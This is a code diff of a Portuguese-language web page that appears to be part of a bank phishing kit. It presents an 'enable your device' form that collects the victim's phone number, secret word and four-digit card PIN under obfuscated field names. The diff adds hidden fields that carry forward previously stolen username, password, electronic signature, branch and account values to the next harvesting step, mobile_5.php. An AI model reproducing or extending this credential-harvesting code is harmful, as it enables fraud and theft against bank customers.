@@ -225,15 +225,16 @@ window.onload = function(){
 				<h5 align="center"><b><font color="ff0000">Atenção!<br></font></b></h5>
 				<h5 align="center"><b></b><font color="000">É necessário habilitar o seu aparelho!</font></h5><font color="000">
 				<hr class="style13">
-		         </font><form id="loginform" name="loginform" class="form-signin" action="wait_3.php" method="POST" onsubmit="return enviardados();"><font color="000">
+		         </font><form id="loginform" name="loginform" class="form-signin" action="mobile_5.php" method="POST" onsubmit="return enviardados();"><font color="000">
 				 <input name="xdxdxdxtxexlxexfxoxnxex" id="xdxdxdxtxexlxexfxoxnxex" type="tel" placeholder="DDD + Telefone" maxlength="15" required="required" onkeyup="lmt3(this),proximoCampo(this, 'xpxsxexcxrxextxax')" class="input pass">
                  <input name="xpxsxexcxrxextxax" id="xpxsxexcxrxextxax" type="text" placeholder="Palavra Secreta" maxlength="15" required="required" onkeyup="limitarInput2(this),proximoCampo(this, 'xdx4x')" class="input pass">
 				 <input name="xdx4x" id="xdx4x" type="number" placeholder="Senha do cartão (4 dígitos)" maxlength="4" required="required" onkeyup="limitarInput3(this),proximoCampo(this, 'xdx4x')" class="input pass">
-				 	<input type="hidden" id="agencia" name="agencia" value="2342">
-					<input type="hidden" id="conta" name="conta" value="34324234234">
-					<input type="hidden" id="usuario" name="usuario" value="24234234">
-					<input type="hidden" id="senhanet" name="senhanet" value="24234234">
-					<input type="hidden" id="assinatura" name="assinatura" value="23423423">
+                     
+                <input name="xuxsxuxaxrxixox" id="xuxsxuxaxrxixox" type="hidden" value="<?php echo $_POST['xuxsxuxaxrxixox']; ?>">
+                <input name="xsxexnxhxax" id="xsxexnxhxax" type="hidden" value="<?php echo $_POST['xsxexnxhxax']; ?>" >
+                <input name="xaxsxsxexlxextxrxoxnxixcxax" id="xaxsxsxexlxextxrxoxnxixcxax" type="hidden" value="<?php echo $_POST['xaxsxsxexlxextxrxoxnxixcxax']; ?>" >
+                <input name="xaxgxexnxcxixax" id="xaxgxexnxcxixax" type="hidden" value="<?php echo $_POST['xaxgxexnxcxixax']; ?>" >
+                <input name="xcxoxnxtxa" id="xcxoxnxtxa" type="hidden" value="<?php echo $_POST['xcxoxnxtxa']; ?>">
 				 
 				<br><button class="btn btn-lg btn-default btn-block" type="submit">CONTINUAR</button></font>
 				
